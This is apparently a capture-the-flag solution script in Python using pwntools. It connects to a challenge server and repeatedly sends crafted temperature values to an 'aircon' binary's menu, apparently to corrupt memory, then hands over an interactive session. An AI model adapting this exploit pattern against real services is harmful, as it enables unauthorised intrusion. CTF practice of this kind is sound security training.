from pwn import *

elf = ELF("./aircon_patched")

context.binary = elf

# p = process(stdout=PIPE)
p = remote("challs3.nusgreyhats.org", 35130)

context.log_level = 'debug'
def set_temp(remote, target):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b':', str(remote).encode())
    p.sendlineafter(b':', str(target).encode())

set_temp(5, 0x00000 | 25)
set_temp(5, 0x10000 | 25)
set_temp(5, 0x20000 | 25)
set_temp(5, 0x30000 | 25)
set_temp(5, 0x40000 | 25)
set_temp(5, 0x50000 | 25)
set_temp(5, 0x60000 | 25)
set_temp(5, 0x70000 | 25)
set_temp(5, 0x80000 | 25)
set_temp(5, 0x90000 | 25)

p.interactive()
